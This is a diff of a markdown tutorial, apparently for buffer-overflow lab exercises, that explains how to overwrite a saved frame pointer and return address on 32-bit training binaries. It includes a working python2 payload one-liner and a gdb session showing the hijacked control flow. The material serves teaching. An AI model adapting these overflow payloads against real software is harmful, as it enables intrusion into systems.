@@ -37,7 +37,7 @@ Dump of assembler code for function main:
    0x080486f4 <+76>:    ret
 End of assembler dump.
 ```
-Our target is to execute only the “drink coffee” print without the “Do not” print.
+</br>Our target is to execute only the “drink coffee” print without the “Do not” print.
 After a brief look on the assembly code we can see that there are two prints: **<+35>** and **<+56>**  
 There is no jump or compare before any of them so we need to think of a way to tamper with the execution flow.
 
@@ -77,9 +77,10 @@ top of the stack                                             bottom of stack
 bottom of memory                                             top of memory
 ```
 
-</br>In order to change the execution flow we want to change the saved eip to skip the “Do not” print.  
+</br>There is a simple trick here, when **foo** is executing ```ret``` the saved return is popped from the stack and jumped to.  
+In order to change the execution flow we want to overwrite the saved eip to skip the “Do not” print.  
 
-After understanding the security flaw we can **overwrite the return address** by exploiting the buffer overflow.
+After understanding the security flaw we can **overwrite the return address** by exploiting the buffer overflow.  
 We’ll craft the payload like this: 24 characters for padding + main’s ebp + new return address
 
 The line we need to jump to is line <main +40> 0x080486d0  
@@ -87,7 +88,7 @@ The os is using Little endian architecture
 
 ![image](https://github.com/0xtal4/buffer-overflow-exercises/assets/48101413/8a8ed180-4a35-4715-970a-99d88ecbb893)  
 
-So, in order to overwrite the eip to **0x080486d0** we need to write **0xd0860408**
+So, in order to overwrite the eip to **0x080486d0** we need to write **0xd0860408**  
 In order to avoid segfault we need to overwrite the correct saved frame pointer to the ebp of main.
 
 ```
@@ -110,9 +111,12 @@ fs             0x0                 0x0
 gs             0x63                0x63
 ```
 
-The final payload will be                             
-python2 -c "print('A'*24+'\x88\xcf\xff\xff\xd3\x86\x04\x08')"
-
+Main's ebp=**0xffffcf88** 
+The final payload will be
+```python
+#                 padding        sfp(little endian)    ret(little endian)
+python2 -c "print('A'*24    +   '\x88\xcf\xff\xff'+   '\xd3\x86\x04\x08')"
+```
 ```
 gef➤  r <<(python2 -c "print('A'*24+'\x88\xcf\xff\xff\xd3\x86\x04\x08')")
 Starting program: /home/kali/Desktop/tasks/files/three <<(python2 -c "print('A'*24+'\x88\xcf\xff\xff\xd3\x86\x04\x08')")
@@ -124,7 +128,7 @@ drink coffee[Inferior 1 (process 28524) exited normally]
 Success! “drink coffee” is printed!
 </bar>
 ## 4th task
-### Goal: make the binary print "Welcome"
+### Goal: make the binary print "Welcome"</br>
 
 Let’s disassemble main
 ```c
@@ -179,7 +183,10 @@ void foo(void)
 }
 ```
 This function is printing Welcome.  
-So, our goal is to change the execution flow to make our program execute foo().  
+**Our goal is to change the execution flow to make our program execute foo().**  
+</br>The execution flow should be like this:
+ 1. manipulate **bar** to return to **foo**
+ 2. make **foo** return to exit()
 
 As we saw earlier bar is vulnerable to buffer overflow and its stack looks like this-
 
@@ -189,7 +196,7 @@ top of the stack                                             bottom of stack
 bottom of memory                                             top of memory
 ```
 
-By overflowing the buffer we can overwrite the return address into foo’s address.
+By overflowing the buffer we can overwrite bar's saved return address into foo’s address.
 
 ```
 $ objdump -d four | grep foo
@@ -230,7 +237,7 @@ bottom of memory                                                         top of 
 ```
 
 </br>We can overflow into foo’s stack and write the return address onto its stack and by doing this we mimic a natural “call” operation where before jumping into the function the return address is pushed onto the stack.
-By doing this we can make **foo** returning to **exit** and avoiding segfault!!!
+By doing this we can make **foo** returning to **exit** and avoid segfault!!!
 
 
 Crafting the payload:
